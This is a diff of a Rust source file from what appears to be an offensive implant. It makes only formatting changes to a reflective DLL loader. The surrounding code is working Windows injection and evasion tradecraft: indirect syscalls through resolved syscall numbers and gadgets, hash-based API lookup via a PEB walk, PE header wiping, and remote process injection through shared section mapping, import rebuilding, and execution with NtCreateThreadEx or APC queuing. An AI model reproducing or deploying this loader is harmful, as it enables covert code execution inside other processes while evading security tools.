@@ -52,29 +52,34 @@
 
 #![cfg(all(windows, feature = "reflective-loader", target_arch = "x86_64"))]
 
+use std::collections::HashMap;
 use std::ffi::c_void;
 use std::mem;
-use std::collections::HashMap;
 
-use anyhow::{anyhow, bail, Result};
+use crate::syscalls::{do_syscall, get_syscall_id, map_clean_dll, SyscallTarget};
 use crate::win_types::SIZE_T;
-use crate::win_types::{HANDLE, PVOID, UNICODE_STRING};
-use windows_sys::Win32::System::Kernel::LIST_ENTRY;
-use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_NT_HEADERS32, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
-use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER};
-use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ, SECTION_ALL_ACCESS, SEC_COMMIT};
-use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE};
 use crate::win_types::{CONTEXT, CONTEXT_FULL, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
+use crate::win_types::{HANDLE, PVOID, UNICODE_STRING};
+use anyhow::{anyhow, bail, Result};
 use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR32_MAGIC;
 use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR64_MAGIC;
+use windows_sys::Win32::System::Diagnostics::Debug::{
+    IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_DIRECTORY_ENTRY_IMPORT,
+    IMAGE_NT_HEADERS32, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
+};
+use windows_sys::Win32::System::Kernel::LIST_ENTRY;
+use windows_sys::Win32::System::Memory::PAGE_READONLY;
+use windows_sys::Win32::System::Memory::{
+    MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ, SECTION_ALL_ACCESS, SEC_COMMIT,
+};
+use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
 use windows_sys::Win32::System::SystemServices::IMAGE_REL_BASED_ABSOLUTE;
 use windows_sys::Win32::System::SystemServices::IMAGE_REL_BASED_DIR64;
 use windows_sys::Win32::System::SystemServices::IMAGE_REL_BASED_HIGH;
 use windows_sys::Win32::System::SystemServices::IMAGE_REL_BASED_HIGHADJ;
 use windows_sys::Win32::System::SystemServices::IMAGE_REL_BASED_HIGHLOW;
 use windows_sys::Win32::System::SystemServices::IMAGE_REL_BASED_LOW;
-use windows_sys::Win32::System::Memory::PAGE_READONLY;
-use crate::syscalls::{do_syscall, get_syscall_id, map_clean_dll, SyscallTarget};
+use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE};
 
 // ── Constants ───────────────────────────────────────────────────────────────
 
@@ -314,8 +319,11 @@ fn parse_pe_headers(dll_bytes: &[u8]) -> Result<PeInfo> {
         }
         let number_of_sections =
             u16::from_le_bytes(dll_bytes[fh_offset + 2..fh_offset + 4].try_into().unwrap());
-        let size_of_optional_header =
-            u16::from_le_bytes(dll_bytes[fh_offset + 16..fh_offset + 18].try_into().unwrap());
+        let size_of_optional_header = u16::from_le_bytes(
+            dll_bytes[fh_offset + 16..fh_offset + 18]
+                .try_into()
+                .unwrap(),
+        );
 
         // Read optional header magic
         let opt_offset = fh_offset + 20;
@@ -406,16 +414,14 @@ fn dir_entry(
 }
 
 /// Get a pointer to the section header array from DLL bytes.
-fn get_section_headers<'a>(
-    dll_bytes: &'a [u8],
-    pe: &PeInfo,
-) -> Result<&'a [IMAGE_SECTION_HEADER]> {
+fn get_section_headers<'a>(dll_bytes: &'a [u8], pe: &PeInfo) -> Result<&'a [IMAGE_SECTION_HEADER]> {
     let section_offset = pe.nt_header_offset
         + 4 // PE signature
         + mem::size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_FILE_HEADER>()
         + pe.size_of_optional_header as usize;
 
-    let section_table_size = pe.number_of_sections as usize * mem::size_of::<IMAGE_SECTION_HEADER>();
+    let section_table_size =
+        pe.number_of_sections as usize * mem::size_of::<IMAGE_SECTION_HEADER>();
     if section_offset + section_table_size > dll_bytes.len() {
         bail!("Section table extends beyond DLL bytes");
     }
@@ -426,8 +432,7 @@ fn get_section_headers<'a>(
 
 /// Resolve a syscall target, wrapping the error.
 fn resolve_syscall(name: &str) -> Result<SyscallTarget> {
-    get_syscall_id(name)
-        .map_err(|e| anyhow!("failed to resolve SSN for {}: {}", name, e))
+    get_syscall_id(name).map_err(|e| anyhow!("failed to resolve SSN for {}: {}", name, e))
 }
 
 /// Close an NT handle safely via NtClose.
@@ -442,10 +447,7 @@ fn close_nt_handle(handle: HANDLE) {
 /// Create a section object backed by the page file (SEC_COMMIT).
 ///
 /// Returns the section handle on success.  The caller must close it.
-unsafe fn nt_create_section(
-    maximum_size: usize,
-    page_protection: u32,
-) -> Result<HANDLE> {
+unsafe fn nt_create_section(maximum_size: usize, page_protection: u32) -> Result<HANDLE> {
     let sys = resolve_syscall("NtCreateSection")?;
     let mut h_section: HANDLE = std::ptr::null_mut();
 
@@ -453,13 +455,13 @@ unsafe fn nt_create_section(
         sys.ssn,
         sys.gadget_addr,
         &[
-            &mut h_section as *mut _ as u64,   // SectionHandle
-            SECTION_ALL_ACCESS as u64,          // DesiredAccess
-            std::ptr::null_mut::<u64>() as u64, // ObjectAttributes (NULL)
+            &mut h_section as *mut _ as u64,             // SectionHandle
+            SECTION_ALL_ACCESS as u64,                   // DesiredAccess
+            std::ptr::null_mut::<u64>() as u64,          // ObjectAttributes (NULL)
             &(maximum_size as i64) as *const i64 as u64, // MaximumSize
-            page_protection as u64,             // SectionPageProtection
-            SEC_COMMIT as u64,                  // AllocationAttributes
-            std::ptr::null_mut::<u64>() as u64, // FileHandle (NULL = page file)
+            page_protection as u64,                      // SectionPageProtection
+            SEC_COMMIT as u64,                           // AllocationAttributes
+            std::ptr::null_mut::<u64>() as u64,          // FileHandle (NULL = page file)
         ],
     );
 
@@ -489,24 +491,21 @@ unsafe fn nt_map_view_of_section(
         sys.ssn,
         sys.gadget_addr,
         &[
-            h_section as u64,                    // SectionHandle
-            process_handle as u64,               // ProcessHandle
-            &mut base_addr as *mut _ as u64,     // BaseAddress
-            0,                                   // ZeroBits
-            0,                                   // CommitSize
-            std::ptr::null_mut::<u64>() as u64,  // SectionOffset
+            h_section as u64,                       // SectionHandle
+            process_handle as u64,                  // ProcessHandle
+            &mut base_addr as *mut _ as u64,        // BaseAddress
+            0,                                      // ZeroBits
+            0,                                      // CommitSize
+            std::ptr::null_mut::<u64>() as u64,     // SectionOffset
             &mut actual_view_size as *mut _ as u64, // ViewSize
-            1,                                   // InheritDisposition (ViewShare)
-            0,                                   // AllocationType
-            page_protection as u64,              // Win32Protect
+            1,                                      // InheritDisposition (ViewShare)
+            0,                                      // AllocationType
+            page_protection as u64,                 // Win32Protect
         ],
     );
 
     if status != 0 {
-        bail!(
-            "NtMapViewOfSection failed with status {:#x}",
-            status as u32
-        );
+        bail!("NtMapViewOfSection failed with status {:#x}", status as u32);
     }
     if base_addr.is_null() {
         bail!("NtMapViewOfSection returned null base address");
@@ -550,8 +549,8 @@ unsafe fn nt_protect_virtual_memory(
         sys.ssn,
         sys.gadget_addr,
         &[
-            process_handle as u64,            // ProcessHandle
-            &mut base_ptr as *mut _ as u64,   // BaseAddress
+            process_handle as u64,             // ProcessHandle
+            &mut base_ptr as *mut _ as u64,    // BaseAddress
             &mut region_size as *mut _ as u64, // RegionSize
             new_protect as u64,                // NewProtect
             &mut old_protect as *mut _ as u64, // OldProtect
@@ -580,11 +579,11 @@ unsafe fn nt_write_virtual_memory(
         sys.ssn,
         sys.gadget_addr,
         &[
-            process_handle as u64,                 // ProcessHandle
-            base as u64,                            // BaseAddress
-            data.as_ptr() as u64,                   // Buffer
-            data.len() as u64,                      // NumberOfBytesToWrite
-            &mut bytes_written as *mut _ as u64,    // NumberOfBytesWritten
+            process_handle as u64,               // ProcessHandle
+            base as u64,                         // BaseAddress
+            data.as_ptr() as u64,                // Buffer
+            data.len() as u64,                   // NumberOfBytesToWrite
+            &mut bytes_written as *mut _ as u64, // NumberOfBytesWritten
         ],
     );
 
@@ -617,11 +616,11 @@ unsafe fn nt_read_virtual_memory(
         sys.ssn,
         sys.gadget_addr,
         &[
-            process_handle as u64,              // ProcessHandle
-            base as u64,                        // BaseAddress
-            buffer.as_mut_ptr() as u64,         // Buffer
-            buffer.len() as u64,                // NumberOfBytesToRead
-            &mut bytes_read as *mut _ as u64,   // NumberOfBytesRead
+            process_handle as u64,            // ProcessHandle
+            base as u64,                      // BaseAddress
+            buffer.as_mut_ptr() as u64,       // Buffer
+            buffer.len() as u64,              // NumberOfBytesToRead
+            &mut bytes_read as *mut _ as u64, // NumberOfBytesRead
         ],
     );
 
@@ -706,13 +705,8 @@ unsafe fn normalize_import_dll_name(name: &str) -> String {
 }
 
 unsafe fn get_remote_ntdll_base(process_handle: HANDLE) -> Option<usize> {
-    type NtQueryInformationProcessFn = unsafe extern "system" fn(
-        HANDLE,
-        u32,
-        *mut c_void,
-        u32,
-        *mut u32,
-    ) -> i32;
+    type NtQueryInformationProcessFn =
+        unsafe extern "system" fn(HANDLE, u32, *mut c_void, u32, *mut u32) -> i32;
 
     let local_ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))?;
     let ntqip_addr = pe_resolve::get_proc_address_by_hash(
@@ -784,16 +778,12 @@ unsafe fn get_remote_ntdll_base(process_handle: HANDLE) -> Option<usize> {
 }
 
 unsafe fn build_remote_module_map(process_handle: HANDLE) -> Result<HashMap<String, usize>> {
-    type NtQueryInformationProcessFn = unsafe extern "system" fn(
-        HANDLE,
-        u32,
-        *mut c_void,
-        u32,
-        *mut u32,
-    ) -> i32;
+    type NtQueryInformationProcessFn =
+        unsafe extern "system" fn(HANDLE, u32, *mut c_void, u32, *mut u32) -> i32;
 
-    let local_ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
-        .ok_or_else(|| anyhow!("build_remote_module_map: ntdll not found via PEB walk"))?;
+    let local_ntdll =
+        pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
+            .ok_or_else(|| anyhow!("build_remote_module_map: ntdll not found via PEB walk"))?;
     let ntqip_addr = pe_resolve::get_proc_address_by_hash(
         local_ntdll,
         pe_resolve::hash_str(b"NtQueryInformationProcess\0"),
@@ -817,8 +807,9 @@ unsafe fn build_remote_module_map(process_handle: HANDLE) -> Result<HashMap<Stri
         );
     }
 
-    let peb: RemotePeb = nt_read_remote_struct(process_handle, pbi.peb_base_address as *const c_void)
-        .map_err(|_| anyhow!("build_remote_module_map: failed to read remote PEB"))?;
+    let peb: RemotePeb =
+        nt_read_remote_struct(process_handle, pbi.peb_base_address as *const c_void)
+            .map_err(|_| anyhow!("build_remote_module_map: failed to read remote PEB"))?;
     if peb.ldr.is_null() {
         bail!("build_remote_module_map: remote PEB.Ldr is null");
     }
@@ -933,11 +924,13 @@ unsafe fn resolve_remote_export(
 
     for i in 0..num_names {
         let name_rva = u32::from_le_bytes(name_ptrs[i * 4..i * 4 + 4].try_into().unwrap()) as usize;
-        let name_raw = read_bytes(remote_dll_base + name_rva, 256).unwrap_or_else(|_| vec![0u8; 256]);
+        let name_raw =
+            read_bytes(remote_dll_base + name_rva, 256).unwrap_or_else(|_| vec![0u8; 256]);
         let nul = name_raw.iter().position(|&b| b == 0).unwrap_or(256);
         let name = std::str::from_utf8(&name_raw[..nul]).unwrap_or("");
         if name == fn_name {
-            let ordinal = u16::from_le_bytes(ordinals[i * 2..i * 2 + 2].try_into().unwrap()) as usize;
+            let ordinal =
+                u16::from_le_bytes(ordinals[i * 2..i * 2 + 2].try_into().unwrap()) as usize;
             let fn_rva_bytes = read_bytes(remote_dll_base + fn_table_rva + ordinal * 4, 4)?;
             let fn_rva = u32::from_le_bytes(fn_rva_bytes.try_into().unwrap()) as usize;
             if fn_rva >= export_rva && fn_rva < export_rva + export_size {
@@ -1341,7 +1334,11 @@ unsafe fn ensure_remote_module_loaded(
         &mut loaded_remote_base as *mut _ as *mut u8,
         std::mem::size_of::<usize>(),
     );
-    let read_res = nt_read_virtual_memory(process_handle, remote_base_out as *const c_void, &mut base_buf);
+    let read_res = nt_read_virtual_memory(
+        process_handle,
+        remote_base_out as *const c_void,
+        &mut base_buf,
+    );
 
     close_nt_handle(h_thread);
     cleanup_block(remote_block);
@@ -1497,7 +1494,10 @@ unsafe fn rebuild_iat_reflective_remote(
 
                 while (*original_thunk).u1.AddressOfData != 0 {
                     let addr_of_data = (*original_thunk).u1.AddressOfData;
-                    let proc_addr = if (addr_of_data & windows_sys::Win32::System::SystemServices::IMAGE_ORDINAL_FLAG32) != 0 {
+                    let proc_addr = if (addr_of_data
+                        & windows_sys::Win32::System::SystemServices::IMAGE_ORDINAL_FLAG32)
+                        != 0
+                    {
                         let ordinal = (addr_of_data & 0xffff) as u16;
                         resolve_remote_export_by_ordinal(process_handle, remote_dll_base, ordinal)?
                     } else {
@@ -1531,7 +1531,10 @@ unsafe fn rebuild_iat_reflective_remote(
 
                 while (*original_thunk).u1.AddressOfData != 0 {
                     let addr_of_data = (*original_thunk).u1.AddressOfData as u64;
-                    let proc_addr = if (addr_of_data & windows_sys::Win32::System::SystemServices::IMAGE_ORDINAL_FLAG64) != 0 {
+                    let proc_addr = if (addr_of_data
+                        & windows_sys::Win32::System::SystemServices::IMAGE_ORDINAL_FLAG64)
+                        != 0
+                    {
                         let ordinal = (addr_of_data & 0xffff) as u16;
                         resolve_remote_export_by_ordinal(process_handle, remote_dll_base, ordinal)?
                     } else {
@@ -1578,11 +1581,7 @@ unsafe fn copy_image(base: *mut c_void, dll_bytes: &[u8], pe: &PeInfo) -> Result
         + pe.number_of_sections as usize * mem::size_of::<IMAGE_SECTION_HEADER>();
     let headers_size = align_up(headers_size, PAGE_SIZE).min(dll_bytes.len());
 
-    std::ptr::copy_nonoverlapping(
-        dll_bytes.as_ptr(),
-        base_ptr,
-        headers_size,
-    );
+    std::ptr::copy_nonoverlapping(dll_bytes.as_ptr(), base_ptr, headers_size);
 
     // Copy each section from its file offset to its virtual address
     let sections = get_section_headers(dll_bytes, pe)?;
@@ -1603,11 +1602,7 @@ unsafe fn copy_image(base: *mut c_void, dll_bytes: &[u8], pe: &PeInfo) -> Result
         std::ptr::write_bytes(dest, 0u8, virtual_size);
 
         if copy_size > 0 && raw_offset + copy_size <= dll_bytes.len() {
-            std::ptr::copy_nonoverlapping(
-                dll_bytes.as_ptr().add(raw_offset),
-                dest,
-                copy_size,
-            );
+            std::ptr::copy_nonoverlapping(dll_bytes.as_ptr().add(raw_offset), dest, copy_size);
         }
     }
 
@@ -1623,11 +1618,7 @@ unsafe fn copy_image(base: *mut c_void, dll_bytes: &[u8], pe: &PeInfo) -> Result
 /// - `LOW` (16-bit): add delta low 16 bits to the 2-byte value
 /// - `HIGHADJ` (32-bit): adjust high 16 bits with a signed cookie
 /// - `ABSOLUTE`: skip (padding)
-unsafe fn apply_relocations(
-    base: usize,
-    pe: &PeInfo,
-    dll_bytes: &[u8],
-) -> Result<()> {
+unsafe fn apply_relocations(base: usize, pe: &PeInfo, dll_bytes: &[u8]) -> Result<()> {
     let (reloc_rva, reloc_size) = match pe.reloc_dir {
         Some(r) => r,
         None => return Ok(()), // No relocations needed
@@ -1672,24 +1663,21 @@ unsafe fn apply_relocations(
                     // Add high 16 bits of delta to 16-bit value
                     if target_addr + 2 <= base + pe.size_of_image {
                         let val = *(target_addr as *const u16);
-                        *(target_addr as *mut u16) =
-                            val.wrapping_add((delta >> 16) as u16);
+                        *(target_addr as *mut u16) = val.wrapping_add((delta >> 16) as u16);
                     }
                 }
                 IMAGE_REL_BASED_LOW => {
                     // Add low 16 bits of delta to 16-bit value
                     if target_addr + 2 <= base + pe.size_of_image {
                         let val = *(target_addr as *const u16);
-                        *(target_addr as *mut u16) =
-                            val.wrapping_add(delta as u16);
+                        *(target_addr as *mut u16) = val.wrapping_add(delta as u16);
                     }
                 }
                 IMAGE_REL_BASED_HIGHLOW => {
                     // Add full 32-bit delta to 32-bit value
                     if target_addr + 4 <= base + pe.size_of_image {
                         let val = *(target_addr as *const u32);
-                        *(target_addr as *mut u32) =
-                            val.wrapping_add(delta as u32);
+                        *(target_addr as *mut u32) = val.wrapping_add(delta as u32);
                     }
                 }
                 IMAGE_REL_BASED_HIGHADJ => {
@@ -1742,7 +1730,8 @@ unsafe fn rebuild_iat_reflective(base: usize, pe: &PeInfo) -> Result<()> {
         None => return Ok(()), // No imports
     };
 
-    let mut import_desc = (base + import_rva as usize) as *const windows_sys::Win32::System::SystemServices::IMAGE_IMPORT_DESCRIPTOR;
+    let mut import_desc = (base + import_rva as usize)
+        as *const windows_sys::Win32::System::SystemServices::IMAGE_IMPORT_DESCRIPTOR;
 
     while (*import_desc).Name != 0 {
         let dll_name_ptr = (base + (*import_desc).Name as usize) as *const i8;
@@ -1856,7 +1845,9 @@ unsafe fn resolve_export_by_ordinal(base: usize, ordinal: u32) -> usize {
         return 0;
     }
     let nt_off = (*dos).e_lfanew as usize;
-    let opt_off = nt_off + 4 + mem::size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_FILE_HEADER>();
+    let opt_off = nt_off
+        + 4
+        + mem::size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_FILE_HEADER>();
     let magic = *(opt_off as *const u16);
 
     let export_dir_rva = match magic {
@@ -1876,7 +1867,8 @@ unsafe fn resolve_export_by_ordinal(base: usize, ordinal: u32) -> usize {
         return 0;
     }
 
-    let export_dir = (base + export_dir_rva as usize) as *const windows_sys::Win32::System::SystemServices::IMAGE_EXPORT_DIRECTORY;
+    let export_dir = (base + export_dir_rva as usize)
+        as *const windows_sys::Win32::System::SystemServices::IMAGE_EXPORT_DIRECTORY;
     let base_ordinal = (*export_dir).Base;
     let num_funcs = (*export_dir).NumberOfFunctions;
     let funcs = (base + (*export_dir).AddressOfFunctions as usize) as *const u32;
@@ -1902,11 +1894,7 @@ unsafe fn resolve_export_by_ordinal(base: usize, ordinal: u32) -> usize {
 /// - `.rdata` (read-only data) → PAGE_READONLY
 /// - `.data` (read-write data) → PAGE_READWRITE
 /// - Headers → PAGE_READONLY
-unsafe fn apply_section_protections(
-    base: usize,
-    pe: &PeInfo,
-    dll_bytes: &[u8],
-) -> Result<()> {
+unsafe fn apply_section_protections(base: usize, pe: &PeInfo, dll_bytes: &[u8]) -> Result<()> {
     // Protect headers as read-only first
     nt_protect_virtual_memory(
         CURRENT_PROCESS,
@@ -1928,25 +1916,29 @@ unsafe fn apply_section_protections(
         let section_base = (base + virtual_address) as *mut c_void;
         let section_size = align_up(virtual_size, PAGE_SIZE);
 
-        let protect = if characteristics & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_EXECUTE != 0
-            && characteristics & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_WRITE != 0
+        let protect = if characteristics
+            & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_EXECUTE
+            != 0
+            && characteristics & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_WRITE
+                != 0
         {
             PAGE_EXECUTE_READWRITE
-        } else if characteristics & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_EXECUTE != 0 {
+        } else if characteristics
+            & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_EXECUTE
+            != 0
+        {
             PAGE_EXECUTE_READ
-        } else if characteristics & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_WRITE != 0 {
+        } else if characteristics
+            & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_WRITE
+            != 0
+        {
             PAGE_READWRITE
         } else {
             PAGE_READONLY
         };
 
         // Ignore protection failures (some sections may not allow changes)
-        let _ = nt_protect_virtual_memory(
-            CURRENT_PROCESS,
-            section_base,
-            section_size,
-            protect,
-        );
+        let _ = nt_protect_virtual_memory(CURRENT_PROCESS, section_base, section_size, protect);
     }
 
     Ok(())
@@ -2010,12 +2002,8 @@ pub unsafe fn reflective_load(
     };
 
     let h_section = nt_create_section(pe.size_of_image, page_prot)?;
-    let (base_addr, _view_size) = nt_map_view_of_section(
-        h_section,
-        CURRENT_PROCESS,
-        pe.size_of_image,
-        page_prot,
-    )?;
+    let (base_addr, _view_size) =
+        nt_map_view_of_section(h_section, CURRENT_PROCESS, pe.size_of_image, page_prot)?;
 
     // Close the section handle — the mapping remains valid
     close_nt_handle(h_section);
@@ -2073,7 +2061,11 @@ pub unsafe fn reflective_load(
         // DllMain signature: fn(hModule: HINSTANCE, reason: u32, reserved: LPVOID)
         type DllMainFn = unsafe extern "system" fn(*mut c_void, u32, *mut c_void) -> i32;
         let dll_main: DllMainFn = mem::transmute(entry_point as *const ());
-        dll_main(base as *mut c_void, DLL_PROCESS_ATTACH, std::ptr::null_mut());
+        dll_main(
+            base as *mut c_void,
+            DLL_PROCESS_ATTACH,
+            std::ptr::null_mut(),
+        );
     }
 
     if config.cleanup_headers {
@@ -2089,11 +2081,9 @@ pub unsafe fn reflective_load(
         size,
         entry_point,
         module_handle: base,
-        cleanup_fn: Some(Box::new(move || {
-            unsafe {
-                if let Err(e) = nt_unmap_view_of_section(cleanup_base as *mut c_void) {
-                    tracing::warn!("reflective_loader: cleanup unmap failed: {}", e);
-                }
+        cleanup_fn: Some(Box::new(move || unsafe {
+            if let Err(e) = nt_unmap_view_of_section(cleanup_base as *mut c_void) {
+                tracing::warn!("reflective_loader: cleanup unmap failed: {}", e);
             }
         })),
     })
@@ -2175,12 +2165,8 @@ pub unsafe fn reflective_load_remote(
     let h_section = nt_create_section(pe.size_of_image, PAGE_EXECUTE_READWRITE)?;
 
     // Map into the agent process for writing
-    let (local_base, _local_size) = nt_map_view_of_section(
-        h_section,
-        CURRENT_PROCESS,
-        pe.size_of_image,
-        PAGE_READWRITE,
-    )?;
+    let (local_base, _local_size) =
+        nt_map_view_of_section(h_section, CURRENT_PROCESS, pe.size_of_image, PAGE_READWRITE)?;
 
     // Copy the raw image into the shared local view.
     copy_image(local_base, dll_bytes, &pe)?;
@@ -2215,21 +2201,13 @@ pub unsafe fn reflective_load_remote(
     // Resolve imports in target-process address space and write resolved
     // addresses into the shared IAT.
     if remote_config.load_config.resolve_imports {
-        rebuild_iat_reflective_remote(
-            remote_config.process_handle,
-            local_addr,
-            remote_addr,
-            &pe,
-        )?;
+        rebuild_iat_reflective_remote(remote_config.process_handle, local_addr, remote_addr, &pe)?;
     }
 
     // Apply section protections in the target process
-    if let Err(e) = apply_section_protections_remote(
-        remote_config.process_handle,
-        remote_addr,
-        &pe,
-        dll_bytes,
-    ) {
+    if let Err(e) =
+        apply_section_protections_remote(remote_config.process_handle, remote_addr, &pe, dll_bytes)
+    {
         tracing::warn!("reflective_loader: remote section protection failed: {}", e);
     }
 
@@ -2288,13 +2266,22 @@ unsafe fn apply_section_protections_remote(
         let section_base = (base + virtual_address) as *mut c_void;
         let section_size = align_up(virtual_size, PAGE_SIZE);
 
-        let protect = if characteristics & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_EXECUTE != 0
-            && characteristics & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_WRITE != 0
+        let protect = if characteristics
+            & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_EXECUTE
+            != 0
+            && characteristics & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_WRITE
+                != 0
         {
             PAGE_EXECUTE_READWRITE
-        } else if characteristics & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_EXECUTE != 0 {
+        } else if characteristics
+            & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_EXECUTE
+            != 0
+        {
             PAGE_EXECUTE_READ
-        } else if characteristics & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_WRITE != 0 {
+        } else if characteristics
+            & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_WRITE
+            != 0
+        {
             PAGE_READWRITE
         } else {
             PAGE_READONLY
@@ -2326,25 +2313,22 @@ unsafe fn trigger_remote_execution(
                 sys.ssn,
                 sys.gadget_addr,
                 &[
-                    &mut h_thread as *mut _ as u64,  // ThreadHandle
-                    0x1FFFFF,                         // THREAD_ALL_ACCESS
+                    &mut h_thread as *mut _ as u64,     // ThreadHandle
+                    0x1FFFFF,                           // THREAD_ALL_ACCESS
                     std::ptr::null_mut::<u64>() as u64, // ObjectAttributes
-                    process_handle as u64,            // ProcessHandle
-                    entry_point as u64,               // StartRoutine
-                    base_addr as u64,                 // Argument (hModule for DllMain)
-                    0,                                // CreateFlags (0 = run immediately)
-                    0,                                // ZeroBits
-                    0,                                // StackSize (0 = default)
-                    0,                                // MaxStackSize (0 = default)
+                    process_handle as u64,              // ProcessHandle
+                    entry_point as u64,                 // StartRoutine
+                    base_addr as u64,                   // Argument (hModule for DllMain)
+                    0,                                  // CreateFlags (0 = run immediately)
+                    0,                                  // ZeroBits
+                    0,                                  // StackSize (0 = default)
+                    0,                                  // MaxStackSize (0 = default)
                     std::ptr::null_mut::<u64>() as u64, // AttributeList
                 ],
             );
 
             if status != 0 {
-                bail!(
-                    "NtCreateThreadEx failed with status {:#x}",
-                    status as u32
-                );
+                bail!("NtCreateThreadEx failed with status {:#x}", status as u32);
             }
             close_nt_handle(h_thread);
             Ok(())
@@ -2358,18 +2342,15 @@ unsafe fn trigger_remote_execution(
                 sys.ssn,
                 sys.gadget_addr,
                 &[
-                    *thread_handle as u64,            // ThreadHandle
-                    entry_point as u64,               // ApcRoutine
-                    base_addr as u64,                 // ApcContext (hModule)
-                    0,                                // ApcStatus
-                    0,                                // ApcReserved
+                    *thread_handle as u64, // ThreadHandle
+                    entry_point as u64,    // ApcRoutine
+                    base_addr as u64,      // ApcContext (hModule)
+                    0,                     // ApcStatus
+                    0,                     // ApcReserved
                 ],
             );
             if status != 0 {
-                bail!(
-                    "NtQueueApcThread failed with status {:#x}",
-                    status as u32
-                );
+                bail!("NtQueueApcThread failed with status {:#x}", status as u32);
             }
             Ok(())
         }
